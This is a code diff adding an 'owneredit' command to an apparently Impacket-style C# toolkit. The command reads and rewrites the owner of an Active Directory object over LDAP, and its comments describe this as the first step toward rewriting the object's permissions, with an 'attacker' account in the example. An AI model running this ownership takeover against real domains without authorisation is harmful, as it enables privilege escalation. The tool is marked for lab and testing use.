@@ -1103,6 +1103,107 @@ switch (args[0])
         return 2;
     }
 
+    case "owneredit":
+    {
+        // owneredit.py: read or change the Owner (OwnerSid) of an AD object's security descriptor.
+        //   read  — search the target's nTSecurityDescriptor (SD-flags control = OWNER only, 0x01),
+        //           parse the OwnerSid and print it (SID + resolved name).
+        //   write — replace OwnerSid with <new-owner>'s SID, then ModifyReplace nTSecurityDescriptor
+        //           with the same OWNER-only control. Taking ownership is the precondition for then
+        //           rewriting the DACL (cf. dacledit). LAB-ONLY; see docs.
+        if (args.Length < 7)
+        {
+            Console.Error.WriteLine("usage: owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]");
+            Console.Error.WriteLine("  e.g. owneredit read  127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local Administrator");
+            Console.Error.WriteLine("       owneredit write 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local target1 attacker");
+            return 2;
+        }
+
+        string action = args[1];
+        string host = args[2];
+        string user = args[3];
+        string password = args[4];
+        string domainFqdn = args[5];
+        string target = args[6];
+        string newOwner = args.Length > 7 ? args[7] : string.Empty;
+        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
+        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
+
+        using LdapConnection ldap = LdapConnection.Connect(host, 389);
+        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
+        if (!bind.Success)
+        {
+            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
+            return 1;
+        }
+
+        string ResolveSid(string sam)
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
+                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
+                new[] { "objectSid" });
+            byte[]? raw = es.Count > 0 ? es[0].GetRaw("objectSid") : null;
+            return raw is null ? string.Empty : LdapSid.ToCanonical(raw);
+        }
+
+        string ResolveName(string sidString)
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
+                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
+            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
+            return string.IsNullOrEmpty(name) ? sidString : name;
+        }
+
+        // Fetch the target's DN + nTSecurityDescriptor (OWNER only, via the SD-flags control 0x01).
+        IReadOnlyList<SearchEntry> hits = ldap.Search(baseDn,
+            LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", target)),
+            new[] { "distinguishedName", "nTSecurityDescriptor" },
+            sdFlags: LdapConnection.SdFlagsOwner);
+        if (hits.Count == 0 || hits[0].GetRaw("nTSecurityDescriptor") is not { } sdBytes)
+        {
+            Console.Error.WriteLine($"Target not found or no SD: {target}");
+            return 1;
+        }
+
+        string targetDn = hits[0].Get("distinguishedName");
+        NtSecurityDescriptor sd = NtSecurityDescriptor.Parse(sdBytes);
+        string currentOwner = LdapSid.ToCanonical(sd.OwnerSid);
+        Console.WriteLine($"Target: {targetDn}");
+        Console.WriteLine($"Current owner: {ResolveName(currentOwner)} ({currentOwner})");
+
+        if (action is "read")
+        {
+            return 0;
+        }
+
+        if (action is not "write")
+        {
+            Console.Error.WriteLine($"Unknown action '{action}' (use read|write).");
+            return 2;
+        }
+
+        if (string.IsNullOrEmpty(newOwner))
+        {
+            Console.Error.WriteLine("write needs a <new-owner> (sAMAccountName).");
+            return 2;
+        }
+
+        string newOwnerSid = ResolveSid(newOwner);
+        if (string.IsNullOrEmpty(newOwnerSid))
+        {
+            Console.Error.WriteLine($"New owner not found: {newOwner}");
+            return 1;
+        }
+
+        sd.OwnerSid = LdapSid.FromCanonical(newOwnerSid);
+        LdapResult res = ldap.ModifyReplace(targetDn, "nTSecurityDescriptor",
+            new[] { sd.GetData() }, sdFlags: LdapConnection.SdFlagsOwner);
+        Console.WriteLine(res.Success
+            ? $"[+] Owner of {targetDn} set to {newOwner} ({newOwnerSid})"
+            : $"[-] Modify failed (result {res.ResultCode}): {res.DiagnosticMessage}");
+        return res.Success ? 0 : 1;
+    }
+
     case "get-adcomputers":
     {
         // GetADComputers.py: LDAP-search a DC for all computer objects and print
@@ -4286,6 +4387,7 @@ static void PrintUsage()
     Console.WriteLine("                   Full RPC-over-TCP flow: ept_map samr -> connect -> sealed bind -> enum (no SMB).");
     Console.WriteLine("  mssql-cbt <host> [port]   # checkMSSQLStatus: TDS PRELOGIN encryption posture (channel-binding precondition)");
     Console.WriteLine("  dacledit <read|write|remove|backup|restore> <host> <user> <password> <domain-fqdn> <target> [principal] [rights] [ace-type] [file]   # dacledit: read/edit an object's DACL (lab)");
+    Console.WriteLine("  owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]   # owneredit: read/set an object's owner (lab)");
     Console.WriteLine("  rpc-services <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   List installed services via svcctl REnumServicesStatusW (services.py list).");
     Console.WriteLine("  rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
